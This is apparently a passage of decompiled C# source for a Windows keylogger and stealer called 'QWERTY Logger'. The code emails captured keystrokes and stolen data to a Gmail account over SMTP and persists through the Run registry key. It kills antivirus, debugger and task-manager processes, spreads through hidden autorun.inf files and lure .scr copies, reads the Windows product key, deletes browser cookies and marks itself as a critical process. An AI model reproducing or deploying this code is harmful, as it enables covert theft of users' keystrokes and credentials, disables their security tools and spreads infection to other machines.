						TextBox4.set_Text(options[3]);
						goto IL_0398;
						IL_0398:
						num = 40;
						TextBox7.set_Text(options[13]);
						goto IL_03af;
						IL_03af:
						num = 41;
						if (Conversions.ToBoolean(options[4]))
						{
							goto IL_03c4;
						}
						goto IL_03d5;
						IL_03c4:
						num = 43;
						goto IL_03c7;
						IL_03c7:
						num = 44;
						Timer3.Start();
						goto IL_03d5;
						IL_03d5:
						num = 46;
						if (Conversions.ToBoolean(options[5]))
						{
							goto IL_03ea;
						}
						goto IL_0400;
						IL_03ea:
						num = 48;
						goto IL_03ed;
						IL_03ed:
						num = 49;
						AddStartup(((Form)this).get_Text(), Application.get_ExecutablePath());
						goto IL_0400;
						IL_0400:
						num = 51;
						if (Conversions.ToBoolean(options[6]))
						{
							goto IL_0415;
						}
						goto IL_0426;
						IL_0415:
						num = 53;
						goto IL_0418;
						IL_0418:
						num = 54;
						Timer4.Start();
						goto IL_0426;
						IL_0426:
						num = 56;
						if (Conversions.ToBoolean(options[7]))
						{
							goto IL_043b;
						}
						goto IL_0448;
						IL_043b:
						num = 58;
						goto IL_043e;
						IL_043e:
						num = 59;
						TNLgi4bBsY();
						goto IL_0448;
						IL_0448:
						num = 61;
						if (Conversions.ToBoolean(options[8]))
						{
							goto IL_045d;
						}
						goto IL_0469;
						IL_045d:
						num = 63;
						goto IL_0460;
						IL_0460:
						num = 64;
						ujks27DFHJKkjhga129374HGFDAKJHGASD8723GFhdagsjegf2173();
						goto IL_0469;
						IL_0469:
						num = 66;
						if (Conversions.ToBoolean(options[9]))
						{
							goto IL_047f;
						}
						goto IL_048b;
						IL_047f:
						num = 68;
						goto IL_0482;
						IL_0482:
						num = 69;
						KDDhsgd23943173GAJgf239047dsjkg();
						goto IL_048b;
						IL_048b:
						num = 71;
						if (Conversions.ToBoolean(options[10]))
						{
							goto IL_04a1;
						}
						goto IL_04ad;
						IL_04a1:
						num = 73;
						goto IL_04a4;
						IL_04a4:
						num = 74;
						lud283aH2082bca2G32SDV();
						goto IL_04ad;
						IL_04ad:
						num = 76;
						if (Conversions.ToBoolean(options[11]))
						{
							goto IL_04c3;
						}
						goto IL_04d8;
						IL_04c3:
						num = 78;
						goto IL_04c6;
						IL_04c6:
						num = 79;
						IKjsd2933214j1();
						goto IL_04cf;
						IL_04cf:
						num = 80;
						askfuh129836jsa();
						goto IL_04d8;
						IL_04d8:
						num = 82;
						if (Conversions.ToBoolean(options[12]))
						{
							goto IL_04ee;
						}
						goto IL_04ff;
						IL_04ee:
						num = 84;
						goto IL_04f1;
						IL_04f1:
						num = 85;
						Timer6.Start();
						goto IL_04ff;
						IL_04ff:
						num = 87;
						if (Conversions.ToBoolean(options[13]))
						{
							goto IL_0515;
						}
						goto IL_054f;
						IL_0515:
						num = 89;
						goto IL_0518;
						IL_0518:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0520;
						IL_0520:
						num = 91;
						KillProcesses(InternetExplorer: true, Firefox: true);
						goto IL_052b;
						IL_052b:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_0533;
						IL_0533:
						num = 93;
						DeleteIECookies(Enable: true);
						goto IL_053d;
						IL_053d:
						ProjectData.ClearProjectError();
						num3 = -4;
						goto IL_0545;
						IL_0545:
						num = 95;
						DeleteMozillaCookies(Enable: true);
						goto IL_054f;
						IL_054f:
						num = 97;
						if (Conversions.ToBoolean(options[14]))
						{
							goto IL_0565;
						}
						goto IL_0576;
						IL_0565:
						num = 99;
						goto IL_0568;
						IL_0568:
						num = 100;
						Timer7.Start();
						goto IL_0576;
						IL_0576:
						num = 102;
						if (Conversions.ToBoolean(options[15]))
						{
							goto IL_058c;
						}
						goto IL_059d;
						IL_058c:
						num = 104;
						goto IL_058f;
						IL_058f:
						num = 105;
						Timer8.Start();
						goto IL_059d;
						end_IL_0001_2:
						break;
					}
					num = 109;
					Timer1.Start();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1993;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.Subject = "QWERTY Logger Logs - " + ((ServerComputer)MyProject.Computer).get_Name();
		mailMessage.To.Add(TextBox2.get_Text());
		mailMessage.From = new MailAddress(TextBox2.get_Text());
		mailMessage.Body = "- QWERTY Logger Logs -" + nl + nl + TextBox1.get_Text() + nl + nl + nl + " - Stealers - " + nl + nl + textbox5.get_Text() + TextBox6.get_Text();
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.Credentials = new NetworkCredential(TextBox2.get_Text(), TextBox3.get_Text());
		smtpClient.Send(mailMessage);
		((TextBoxBase)TextBox1).Clear();
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(strin, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + GetActiveWindowTitle() + "]:\r\n");
			strin = GetActiveWindowTitle();
		}
	}

	public void DZW52XDOGM()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "keyscrambler", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void GQTo1p4vOS()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "wireshark", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void bycTYHBI2Q()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "anubis", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void cVM42NzSZ1()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "mbam", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void JnuvQY5BtG()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "avp", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void cyJQDvfLat()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "ollydbg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void ou4vyjeHZ5()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void tyk3DbFSW2()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void rgJKZqyGzS()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void X1iu1aUhYb()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		bycTYHBI2Q();
		rgJKZqyGzS();
		JnuvQY5BtG();
		DZW52XDOGM();
		cVM42NzSZ1();
		X1iu1aUhYb();
		tyk3DbFSW2();
		cyJQDvfLat();
		ou4vyjeHZ5();
		GQTo1p4vOS();
	}

	public static void AddStartup(string Name, string Path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Name, Path, RegistryValueKind.String);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		yE4QX1sJ4w();
		kI3nd1sdmfh093HGSDAAdfwe2();
	}

	public void yE4QX1sJ4w()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "taskmgr", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void kI3nd1sdmfh093HGSDAAdfwe2()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "Anvir", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void ujks27DFHJKkjhga129374HGFDAKJHGASD8723GFhdagsjegf2173()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				if (!File.Exists(programFiles + "ntldr.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "ntldr.exe");
				}
				StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open = ntldr.exe");
				streamWriter.WriteLine("shellexecute=ntldr.exe");
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "ntldr.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void KDDhsgd23943173GAJgf239047dsjkg()
	{
		try
		{
			string text = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), LimePfad + text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text2));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void lud283aH2082bca2G32SDV()
	{
		try
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			hostAddresses[0].ToString();
			Dns.GetHostEntry("workgroup");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "workgroup");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void IKjsd2933214j1()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string[] directories = default(string[]);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				int num7;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 337:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_005f;
						case 7:
							goto IL_0063;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_0070;
						case 10:
							goto IL_0088;
						case 11:
							goto IL_00a9;
						case 12:
							goto IL_00c4;
						case 13:
						case 14:
						case 15:
							goto IL_00dc;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 16:
						case 17:
							goto IL_017c;
						}
						goto default;
					}
					IL_00dc:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007f;
					IL_00c4:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\mypornpics.scr");
					goto IL_00dc;
					IL_0009:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0018;
					IL_0018:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0021;
					IL_0021:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_003e;
					IL_003e:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) != 0)
					{
						goto IL_005f;
					}
					goto IL_017c;
					IL_005f:
					num = 6;
					num5 = 0;
					goto IL_0063;
					IL_0063:
					num = 7;
					goto IL_0065;
					IL_0065:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_0070;
					IL_0070:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007f;
					IL_007f:
					num6 = num5;
					num7 = upperBound;
					if (num6 <= num7)
					{
						goto IL_0088;
					}
					goto IL_017c;
					IL_0088:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a9;
					}
					goto IL_00dc;
					IL_00a9:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00c4;
					}
					goto IL_00dc;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 337;
				continue;
			}
			break;
			IL_017c:
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return;
		}
		throw ProjectData.CreateProjectError(-2146828237);
	}

	public void askfuh129836jsa()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string[] directories = default(string[]);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				int num7;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 337:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_005f;
						case 7:
							goto IL_0063;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_0070;
						case 10:
							goto IL_0088;
						case 11:
							goto IL_00a9;
						case 12:
							goto IL_00c4;
						case 13:
						case 14:
						case 15:
							goto IL_00dc;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 16:
						case 17:
							goto IL_017c;
						}
						goto default;
					}
					IL_00dc:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007f;
					IL_00c4:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\ys.scr");
					goto IL_00dc;
					IL_0009:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0018;
					IL_0018:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0021;
					IL_0021:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
					goto IL_003e;
					IL_003e:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) != 0)
					{
						goto IL_005f;
					}
					goto IL_017c;
					IL_005f:
					num = 6;
					num5 = 0;
					goto IL_0063;
					IL_0063:
					num = 7;
					goto IL_0065;
					IL_0065:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_0070;
					IL_0070:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007f;
					IL_007f:
					num6 = num5;
					num7 = upperBound;
					if (num6 <= num7)
					{
						goto IL_0088;
					}
					goto IL_017c;
					IL_0088:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a9;
					}
					goto IL_00dc;
					IL_00a9:
					num = 11;
					if (!File.Exists(directories[num5] + "\\ys.scr"))
					{
						goto IL_00c4;
					}
					goto IL_00dc;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 337;
				continue;
			}
			break;
			IL_017c:
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return;
		}
		throw ProjectData.CreateProjectError(-2146828237);
	}

	public void KDu13sbd()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "cmd", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		KDu13sbd();
	}

	public void KillProcesses(bool InternetExplorer, bool Firefox)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Firefox)
			{
				if (process.MainWindowTitle.Contains("Mozilla Firefox"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0)
				{
					process.Kill();
				}
			}
			if (InternetExplorer)
			{
				if (process.MainWindowTitle.Contains("Internet Explorer"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0)
				{
					process.Kill();
				}
			}
		}
	}

	public void DeleteIECookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteMozillaCookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("cookie"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteMozillaSignons(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("signon"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void JHCS237hsd20j()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "regedit", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public void qnND298bdal235sa()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "Anvir", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		JHCS237hsd20j();
		qnND298bdal235sa();
	}

	private string TNLgi4bBsY()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
		if (registryKey.GetValue("DigitalProductId") is byte[] array)
		{
			char[] array2 = new char[29];
			int num = 28;
			do
			{
				if (checked(num + 1) % 6 != 0)
				{
					int num2 = 0;
					int num3 = 66;
					checked
					{
						do
						{
							int num4 = (num2 << 8) | array[num3];
							array[num3] = (byte)unchecked(num4 / 24);
							num2 = unchecked(num4 % 24);
							array2[num] = "BCDFGHJKMPQRTVWXY2346789"[num2];
							num3 += -1;
						}
						while (num3 >= 52);
					}
				}
				else
				{
					array2[num] = '-';
				}
				num = checked(num + -1);
			}
			while (num >= 0);
			return new string(array2);
		}
		return "value was nothing!";
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long OpenProcess(long dwDesiredAccess, long bInheritHandle, long dwProcessId);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LookupPrivilegeValueA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSystemName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName, ref LUID lpLuid);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, ref TOKEN_PRIVILEGES PreviousState, ref IntPtr ReturnLength);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hHandle);

	[DllImport("ntdll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(bool NewValue, bool OldValue, bool WinLogon);

	public bool GetPrivileges(string privileges)
	{
		IntPtr handle = Process.GetCurrentProcess().Handle;
		LUID_AND_ATTRIBUTES lUID_AND_ATTRIBUTES = default(LUID_AND_ATTRIBUTES);
		TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
		TOKEN_PRIVILEGES PreviousState = default(TOKEN_PRIVILEGES);
		IntPtr TokenHandle = default(IntPtr);
		try
		{
			string lpSystemName = "";
			LUID lpLuid = default(LUID);
			if (LookupPrivilegeValueA(ref lpSystemName, ref privileges, ref lpLuid) == 0)
			{
				return false;
			}
			if (OpenProcessToken(handle, 40, ref TokenHandle) == 0)
			{
				return false;
			}
			lUID_AND_ATTRIBUTES.pLuid = lpLuid;
			lUID_AND_ATTRIBUTES.Attributes = 2;
			NewState.PrivilegeCount = 1;
			NewState.Privileges = new LUID_AND_ATTRIBUTES[1] { lUID_AND_ATTRIBUTES };
			PreviousState.Privileges = new LUID_AND_ATTRIBUTES[checked(NewState.PrivilegeCount + 1)];
			IntPtr ReturnLength = default(IntPtr);
			if (AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges: false, ref NewState, Marshal.SizeOf((object)PreviousState), ref PreviousState, ref ReturnLength) == 0)
			{
				return false;
			}
		}
		finally
		{
			CloseHandle(TokenHandle);
		}
		return true;
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		GetPrivileges("SeSecurityPrivileges");
		RtlSetProcessIsCritical(NewValue: true, OldValue: false, WinLogon: false);
		Timer8.Stop();
	}
}
